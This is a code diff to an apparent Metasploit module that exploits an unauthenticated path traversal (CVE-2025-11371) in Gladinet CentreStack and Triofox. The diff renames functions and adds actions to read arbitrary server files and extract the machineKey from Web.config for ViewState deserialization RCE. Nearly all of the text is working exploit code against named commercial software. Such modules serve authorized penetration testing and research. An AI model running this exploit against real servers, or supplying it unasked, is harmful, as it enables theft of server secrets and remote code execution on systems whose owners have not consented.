@@ -13,14 +13,14 @@ class MetasploitModule < Msf::Auxiliary
     super(
       update_info(
         info,
-        'Name' => 'Gladinet CentreStack/Triofox Local File Inclusion',
+        'Name' => 'Gladinet CentreStack/Triofox Path Traversal',
         'Description' => %q{
-          This module exploits a local file inclusion vulnerability (CVE-2025-11371) in
+          This module exploits a path traversal vulnerability (CVE-2025-11371) in
           Gladinet CentreStack and Triofox that allows an unauthenticated attacker to read
           arbitrary files from the server's file system.
 
           The vulnerability exists in the `/storage/t.dn` endpoint which does not properly
-          sanitize the `s` parameter, allowing directory traversal attacks. This can be used
+          sanitize the `s` parameter, allowing path traversal attacks. This can be used
           to read sensitive files such as Web.config which contains the machineKey used for
           ViewState deserialization attacks (CVE-2025-30406).
 
@@ -43,37 +43,35 @@ class MetasploitModule < Msf::Auxiliary
           'Stability' => [CRASH_SAFE],
           'SideEffects' => [IOC_IN_LOGS],
           'Reliability' => []
-        }
+        },
+        'Actions' => [
+          ['READ_FILE', { 'Description' => 'Read an arbitrary file from the target' }],
+          ['EXTRACT_MACHINEKEY', { 'Description' => 'Read Web.config and extract the machineKey for RCE' }]
+        ],
+        'DefaultAction' => 'EXTRACT_MACHINEKEY'
       )
     )
 
     register_options([
       OptString.new('TARGETURI', [true, 'The base path to the Gladinet CentreStack or Triofox application', '/']),
-      OptString.new('FILEPATH', [true, 'The file to read on the target', DEFAULT_WEB_CONFIG_PATH]),
-      OptString.new('DEPTH', [true, 'Path traversal depth (number of ..\\ sequences)', '..\\..\\..\\']),
-      OptBool.new('EXTRACT_MACHINEKEY', [true, 'Extract machineKey from Web.config if found', true])
+      OptString.new('FILEPATH', [true, 'The file to read on the target', 'Program Files (x86)\\Gladinet Cloud Enterprise\\root\\Web.config']),
+      OptString.new('DEPTH', [true, 'Path traversal depth (number of ..\\ sequences)', '..\\..\\..\\'])
     ])
   end
 
-  def valid_response?(response)
-    response&.code == 200
-  end
-
-  def build_lfi_path(file_path)
-    # Remove C:\ prefix if present (LFI doesn't work with drive letters)
+  def build_traversal_path(file_path)
+    # Remove C:\ prefix if present (path traversal doesn't work with drive letters)
     normalized_path = file_path.gsub(/^[A-Z]:\\/, '').gsub(/^[A-Z]:/, '')
     "#{datastore['DEPTH']}#{normalized_path.gsub(' ', '+')}"
   end
 
-  def send_lfi_request(file_path)
-    # Build URL manually to avoid encoding issues (server expects raw + and parentheses)
-    lfi_path = build_lfi_path(file_path)
-    uri = normalize_uri(target_uri.path, 'storage', 't.dn')
-    uri += "?s=#{lfi_path}&sid=1"
+  def send_traversal_request(file_path)
+    traversal_path = build_traversal_path(file_path)
 
     send_request_cgi({
       'method' => 'GET',
-      'uri' => uri,
+      'uri' => normalize_uri(target_uri.path, 'storage', 't.dn'),
+      'vars_get' => { 's' => traversal_path, 'sid' => '1' },
       'encode_params' => false
     })
   end
@@ -83,24 +81,32 @@ class MetasploitModule < Msf::Auxiliary
     return Exploit::CheckCode::Detected('Gladinet detected but version could not be determined') if version.nil?
 
     rex_version = Rex::Version.new(version)
-    lfi_vulnerable = rex_version <= Rex::Version.new('16.10.10408.56683')
-    return Exploit::CheckCode::Vulnerable("LFI vulnerability confirmed (Build #{version})") if lfi_vulnerable
+    return Exploit::CheckCode::Vulnerable("Path traversal vulnerability confirmed (Build #{version})") if rex_version <= Rex::Version.new('16.10.10408.56683')
 
-    Exploit::CheckCode::Detected("Version #{version} detected, attempting LFI anyway")
+    Exploit::CheckCode::Detected("Version #{version} detected, attempting path traversal anyway")
   end
 
-  def read_file_via_lfi(file_path)
-    print_status("Attempting to read file via LFI: #{file_path}")
+  def read_file(file_path)
+    print_status("Attempting to read file via path traversal: #{file_path}")
 
-    res = send_lfi_request(file_path)
-    return nil unless valid_response?(res)
+    res = send_traversal_request(file_path)
+    return nil unless res&.code == 200
 
     res.body
   end
 
   def run
-    file_content = read_file_via_lfi(datastore['FILEPATH'])
-    return print_error('Failed to read file via LFI') if file_content.nil? || file_content.empty?
+    case action.name
+    when 'READ_FILE'
+      run_read_file
+    when 'EXTRACT_MACHINEKEY'
+      run_extract_machinekey
+    end
+  end
+
+  def run_read_file
+    file_content = read_file(datastore['FILEPATH'])
+    return print_error('Failed to read file via path traversal') if file_content.nil? || file_content.empty?
 
     print_good("Successfully read file: #{datastore['FILEPATH']}")
     print_line
@@ -114,11 +120,30 @@ class MetasploitModule < Msf::Auxiliary
       datastore['RHOST'],
       file_content,
       fname,
-      'File read from Gladinet via LFI (CVE-2025-11371)'
+      'File read from Gladinet via path traversal (CVE-2025-11371)'
     )
     print_good("File saved to: #{path}")
+  end
 
-    return unless datastore['EXTRACT_MACHINEKEY']
+  def run_extract_machinekey
+    file_content = read_file(datastore['FILEPATH'])
+    return print_error('Failed to read file via path traversal') if file_content.nil? || file_content.empty?
+
+    print_good("Successfully read file: #{datastore['FILEPATH']}")
+    print_line
+    print_line(file_content)
+    print_line
+
+    fname = File.basename(datastore['FILEPATH'])
+    path = store_loot(
+      'gladinet.file',
+      'text/plain',
+      datastore['RHOST'],
+      file_content,
+      fname,
+      'File read from Gladinet via path traversal (CVE-2025-11371)'
+    )
+    print_good("File saved to: #{path}")
 
     handle_machinekey_extraction(file_content, datastore['FILEPATH'], 'MachineKey extracted from Gladinet Web.config (CVE-2025-11371)')
   end
